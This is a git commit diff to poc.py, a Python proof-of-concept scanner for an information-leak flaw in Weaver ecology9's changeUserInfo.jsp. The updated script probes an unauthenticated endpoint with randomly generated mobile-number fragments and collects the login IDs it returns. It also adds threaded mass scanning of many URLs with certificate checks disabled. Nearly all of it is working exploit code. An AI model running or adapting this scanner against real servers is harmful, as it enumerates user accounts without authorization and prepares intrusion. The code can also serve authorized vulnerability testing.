3798dbb3d85194bd8d86ce3f7f8860f39a3050da
CoCo ainrm- <137618329@qq.com>
2023-05-27 15:05:22 +0800

    Update poc.py

--- poc.py
+++ poc.py
@@ -1,30 +1,53 @@
 import json
+import random
+import urllib3
 import requests
 import argparse
+import threading
 from urllib.parse import urlparse
 
-
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 headers = {
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    "Accept-Language": "en-us;q=0.8",
+    "Accept": "*/*",
+    "Accept-Language": "en-US",
+    "Accept-Encoding": "gzip, deflate",
     "Cache-Control": "max-age=0",
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0",
     "Connection": "close",
+    "Referer": "https://google.com/"
 }
 
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080",
+}
 
-def loginIdScan(url, uid):
-    path = "/mobile/plugin/changeUserInfo.jsp?type=getUserid&loginId={}".format(uid)
-    parsed_url = urlparse(url)
-    url = parsed_url.scheme + "://" + parsed_url.netloc + path
-    try:
-        response = requests.get(url, headers=headers)
-        data = json.loads(response.text)
-        if data.get("loginId"):
-            loginIds.append(data.get("loginId"))
-    except:
-        print("[+] {}, 可能不存在漏洞！".format(url))
-        exit()
+def getRandomNum(n):
+    digits = list(range(10))
+    random_num_list = []
+    for i in range(n):
+        num_list = random.sample(digits, 2)
+        num = num_list[0] * 10 + num_list[1]
+        random_num_list.append(num)
+    return random_num_list
+
+def loginIdScan(url):
+    loginIds = []
+    for randomNum in randomNums:
+        path = "/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile={}".format(randomNum)
+        parsed_url = urlparse(url)
+        target = parsed_url.scheme + "://" + parsed_url.netloc + path
+        try:
+            response = requests.get(target, headers=headers, verify=False, allow_redirects=False)#, proxies=proxies)
+            if response.status_code == 200:
+                data = json.loads(response.text)
+                loginId = data.get("loginId", -1)
+                if loginId != -1:
+                    loginIds.append(loginId)
+        except:
+            print("[-] {}, 未发现发现loginId或不存在漏洞！".format(parsed_url.netloc))
+            exit()
+    print("[+] {}, 发现loginId: {}".format(parsed_url.netloc, loginIds))
 
 
 def getCookie():
@@ -38,17 +61,20 @@ def getCookie():
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Read file line by line.")
-    parser.add_argument("-f", "--file", type=str, required=True, help="uid.txt")
-    parser.add_argument("-u", "--target", type=str, required=True, help="url")
+    parser = argparse.ArgumentParser(description="ecology9 changeUserInfo信息泄漏检测")
+    parser.add_argument("-u", "--url", type=str, required=False, help="url")
+    parser.add_argument("-U", "--urls", type=str, required=False, help="urls.txt")
     args = parser.parse_args()
 
-    if not (args.file and args.target):
+    randomNums = getRandomNum(50)
+
+    if args.url:
+        loginIdScan(args.url)
+    elif args.urls:
+        with open(args.urls, "r") as file:
+            for line in file:
+                t = threading.Thread(target=loginIdScan, args=(line.strip(),))
+                t.start()
+    else:
         parser.print_help()
         exit()
-
-    with open(args.file) as file:
-        loginIds = []
-        for line in file:
-            loginIds = loginIdScan(args.target, line.strip())
-        print(loginIds)
